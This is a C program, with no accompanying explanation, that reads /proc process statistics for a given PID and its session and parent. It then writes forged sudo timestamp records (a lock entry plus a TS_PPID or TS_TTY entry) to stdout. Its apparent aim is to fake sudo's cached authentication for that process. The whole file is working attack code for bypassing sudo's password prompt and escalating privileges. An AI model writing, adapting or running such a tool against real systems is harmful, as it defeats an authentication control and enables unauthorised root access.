#include <stdio.h>
#include <unistd.h>
#include <limits.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>

typedef struct statstruct_proc {
  int           pid;                      /** The process id. **/
  char          exName [_POSIX_PATH_MAX]; /** The filename of the executable **/
  char          state; /** 1 **/          /** R is running, S is sleeping, 
			   D is sleeping in an uninterruptible wait,
			   Z is zombie, T is traced or stopped **/
  unsigned      euid,                      /** effective user id **/
                egid;                      /** effective group id */					     
  int           ppid;                     /** The pid of the parent. **/
  int           pgrp;                     /** The pgrp of the process. **/
  int           session;                  /** The session id of the process. **/
  int           tty;                      /** The tty the process uses **/
  int           tpgid;                    /** (too long) **/
  unsigned int	flags;                    /** The flags of the process. **/
  unsigned int	minflt;                   /** The number of minor faults **/
  unsigned int	cminflt;                  /** The number of minor faults with childs **/
  unsigned int	majflt;                   /** The number of major faults **/
  unsigned int  cmajflt;                  /** The number of major faults with childs **/
  int           utime;                    /** user mode jiffies **/
  int           stime;                    /** kernel mode jiffies **/
  int		cutime;                   /** user mode jiffies with childs **/
  int           cstime;                   /** kernel mode jiffies with childs **/
  int           counter;                  /** process's next timeslice **/
  int           priority;                 /** the standard nice value, plus fifteen **/
  unsigned int  timeout;                  /** The time in jiffies of the next timeout **/
  unsigned int  itrealvalue;              /** The time before the next SIGALRM is sent to the process **/
  int           starttime; /** 20 **/     /** Time the process started after system boot **/
  unsigned int  vsize;                    /** Virtual memory size **/
  unsigned int  rss;                      /** Resident Set Size **/
  unsigned int  rlim;                     /** Current limit in bytes on the rss **/
  unsigned int  startcode;                /** The address above which program text can run **/
  unsigned int	endcode;                  /** The address below which program text can run **/
  unsigned int  startstack;               /** The address of the start of the stack **/
  unsigned int  kstkesp;                  /** The current value of ESP **/
  unsigned int  kstkeip;                 /** The current value of EIP **/
  int		signal;                   /** The bitmap of pending signals **/
  int           blocked; /** 30 **/       /** The bitmap of blocked signals **/
  int           sigignore;                /** The bitmap of ignored signals **/
  int           sigcatch;                 /** The bitmap of catched signals **/
  unsigned int  wchan;  /** 33 **/        /** (too long) **/
  int		sched, 		  /** scheduler **/
                sched_priority;		  /** scheduler priority **/
		
} procinfo;

int get_proc_info(pid_t pid, procinfo * pinfo)
{
  char szFileName [_POSIX_PATH_MAX],
    szStatStr [2048],
    *s, *t;
  FILE *fp;
  struct stat st;
  
  if (NULL == pinfo) {
    errno = EINVAL;
    return -1;
  }

  sprintf (szFileName, "/proc/%u/stat", (unsigned) pid);
  
  if (-1 == access (szFileName, R_OK)) {
    return (pinfo->pid = -1);
  } /** if **/

  if (-1 != stat (szFileName, &st)) {
  	pinfo->euid = st.st_uid;
  	pinfo->egid = st.st_gid;
  } else {
  	pinfo->euid = pinfo->egid = -1;
  }
  
  
  if ((fp = fopen (szFileName, "r")) == NULL) {
    return (pinfo->pid = -1);
  } /** IF_NULL **/
  
  if ((s = fgets (szStatStr, 2048, fp)) == NULL) {
    fclose (fp);
    return (pinfo->pid = -1);
  }

  /** pid **/
  sscanf (szStatStr, "%u", &(pinfo->pid));
  s = strchr (szStatStr, '(') + 1;
  t = strchr (szStatStr, ')');
  strncpy (pinfo->exName, s, t - s);
  pinfo->exName [t - s] = '\0';
  
  sscanf (t + 2, "%c %d %d %d %d %d %u %u %u %u %u %d %d %d %d %d %d %u %u %d %u %u %u %u %u %u %u %u %d %d %d %d %u",
	  /*       1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33*/
	  &(pinfo->state),
	  &(pinfo->ppid),
	  &(pinfo->pgrp),
	  &(pinfo->session),
	  &(pinfo->tty),
	  &(pinfo->tpgid),
	  &(pinfo->flags),
	  &(pinfo->minflt),
	  &(pinfo->cminflt),
	  &(pinfo->majflt),
	  &(pinfo->cmajflt),
	  &(pinfo->utime),
	  &(pinfo->stime),
	  &(pinfo->cutime),
	  &(pinfo->cstime),
	  &(pinfo->counter),
	  &(pinfo->priority),
	  &(pinfo->timeout),
	  &(pinfo->itrealvalue),
	  &(pinfo->starttime),
	  &(pinfo->vsize),
	  &(pinfo->rss),
	  &(pinfo->rlim),
	  &(pinfo->startcode),
	  &(pinfo->endcode),
	  &(pinfo->startstack),
	  &(pinfo->kstkesp),
	  &(pinfo->kstkeip),
	  &(pinfo->signal),
	  &(pinfo->blocked),
	  &(pinfo->sigignore),
	  &(pinfo->sigcatch),
	  &(pinfo->wchan));
  fclose (fp);
  return 0;
}

/* Time stamp entry types */
#define TS_GLOBAL               0x01    /* not restricted by tty or ppid */
#define TS_TTY                  0x02    /* restricted by tty */
#define TS_PPID                 0x03    /* restricted by ppid */
#define TS_LOCKEXCL             0x04    /* special lock record */

/* Time stamp flags */
#define TS_DISABLED             0x01    /* entry disabled */
#define TS_ANYUID               0x02    /* ignore uid, only valid in key */

struct timestamp_entry {
    unsigned short version;     /* version number */
    unsigned short size;        /* entry size */
    unsigned short type;        /* TS_GLOBAL, TS_TTY, TS_PPID */
    unsigned short flags;       /* TS_DISABLED, TS_ANYUID */
    uid_t auth_uid;             /* uid to authenticate as */
    pid_t sid;                  /* session ID associated with tty/ppid */
    struct timespec start_time; /* session/ppid start time */
    struct timespec ts;         /* time stamp (CLOCK_MONOTONIC) */
    union {
        dev_t ttydev;           /* tty device number */
        pid_t ppid;             /* parent pid */
    } u;
} sudo, sudo0;

int main(int ac, char **av) {
	if (ac <= 1) {
		printf("Usage: %s [pid] [tty|proc]\n", av[0]);
		return 1;
	}
	pid_t pid = atoi(av[1]);
    /* rc = pstat_getproc(&pstat, sizeof(pstat), 0, pid); */
    /* if (rc != -1 || errno == EOVERFLOW) { */
	/* starttime->tv_sec = pstat.pst_start; */
	/* starttime->tv_nsec = 0; */

	procinfo pinfo;
	get_proc_info(pid, &pinfo);

	procinfo pinfo_session;
	get_proc_info(pinfo.session, &pinfo_session);

	procinfo pinfo_parent;
	get_proc_info(pinfo.ppid, &pinfo_parent);

	procinfo pinfo_self;
	get_proc_info(getpid(), &pinfo_self);

	sudo.version = 2;
	sudo.size = sizeof(sudo);
	sudo.flags = 0;
	/* sudo.auth_uid = pinfo.euid; */
	sudo.auth_uid = pinfo.euid;
	sudo.sid = pinfo.session;
	sudo.start_time.tv_sec = pinfo_session.starttime / 100;
	sudo.start_time.tv_nsec = (pinfo_session.starttime % 100) * 10000000;

	sudo.ts.tv_sec = pinfo_self.starttime / 100;
	sudo.ts.tv_nsec = 0;

	sudo.type = TS_PPID;
	sudo.u.ppid = pid;

	sudo0.version = 2;
	sudo0.size = sizeof(sudo);
	sudo0.type = 4;
	write(1, &sudo0, sizeof(sudo));

	if (pinfo.session == pinfo.pid && pinfo_parent.tty == pinfo.tty) {
		fprintf(stderr, "TS_PPID mode\n");
		write(1, &sudo, sizeof(sudo));
	}
	else {
		fprintf(stderr, "TS_TTY mode\n");
		sudo.type = TS_TTY;
		sudo.u.ppid = pinfo.tty;
		write(1, &sudo, sizeof(sudo));
	}
}

/* # screen => session == pid */
/* # spawn => session == pid */
/* # su => session != pid */
